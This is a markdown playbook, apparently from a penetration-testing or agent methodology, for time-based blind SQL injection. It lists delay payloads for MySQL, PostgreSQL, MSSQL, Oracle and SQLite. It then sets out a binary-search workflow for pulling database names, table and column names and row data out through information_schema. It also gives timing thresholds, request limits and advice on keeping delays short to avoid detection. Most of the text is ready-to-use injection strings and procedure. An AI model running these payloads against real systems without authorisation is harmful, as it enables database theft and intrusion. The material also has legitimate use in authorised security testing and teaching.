# Time-Based Blind SQLi

## Prerequisites

- HIGH confidence from Phase 2 (injection confirmed)
- Boolean-based not viable (minimal response differences)
- Baseline timing established with stddev

## Core Principle

Infer data bit-by-bit using conditional time delays. Response time is the only signal.

## Operator Selection (Critical)

```
Record EXISTS   → Use AND: id=1 AND [condition] AND SLEEP(2)
Record MISSING  → Use OR:  id=999 OR [condition] AND SLEEP(2)
```

## Database-Specific Delays

```
MySQL:      SLEEP(2)
PostgreSQL: pg_sleep(2)
MSSQL:      WAITFOR DELAY '0:0:2'
Oracle:     DBMS_PIPE.RECEIVE_MESSAGE('x',2)
SQLite:     (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))))
```

**Delay duration:** 2-3 seconds. Never exceed 3s—risks timeouts and detection.

## Extraction Workflow

### Step 1: Validate Control

Confirm you can trigger delay on demand:
```
TRUE + SLEEP  → delays
FALSE + SLEEP → no delay (short-circuit)
```

Run 3 times each. If inconsistent, check network jitter or reassess.

### Step 2: Extract Length

```
MySQL: IF(LENGTH(database())=N, SLEEP(2), 0)
```

Binary search: start at 8, double/halve until found. Max 20 iterations.

### Step 3: Extract Characters

```
MySQL: IF(ASCII(SUBSTRING(database(),1,1))>N, SLEEP(2), 0)
```

Binary search ASCII range (32-126) per character. ~7 requests per character.

## Extraction Targets

Apply the same pattern to extract:
1. **Database/schema info:** `database()`, `user()`, `@@version`
2. **Table names:** subquery from `information_schema.tables`
3. **Column names:** subquery from `information_schema.columns`
4. **Data:** subquery from target table

Use LIMIT offset to iterate through rows.

## Timing Thresholds

```
Delay detected:     response_time > baseline_avg + (3 * baseline_stddev) + delay_value
No delay:           response_time < baseline_avg + (2 * baseline_stddev)
Inconclusive:       between thresholds → retest
```

## Attempt Limits

- Max 3 retries per character bit on timeout/inconclusive
- Max 500 total requests per extraction target
- If >20% requests inconclusive → network unstable, pause and reassess

## Optimization

**Batch inference:** Extract multiple bits per request where DB supports:
```
MySQL: IF(ASCII(SUBSTRING(x,1,1))&1, SLEEP(2), 0)  -- LSB
```

**Parallelize with caution:** Max 2 concurrent requests to avoid overwhelming target.

## Common Failures

| Symptom | Cause | Fix |
|---------|-------|-----|
| All requests delay | Wrong operator | Switch AND↔OR |
| No requests delay | Injection not executing | Check syntax, escaping |
| Random delays | Network jitter | Increase delay to 3s, more samples |
| Timeouts | Delay too long | Reduce to 2s |

## Stop Conditions

- 3 consecutive timeouts → pause, check target health
- Baseline drift >50% → re-baseline
- Rate limiting detected → back off, reduce frequency
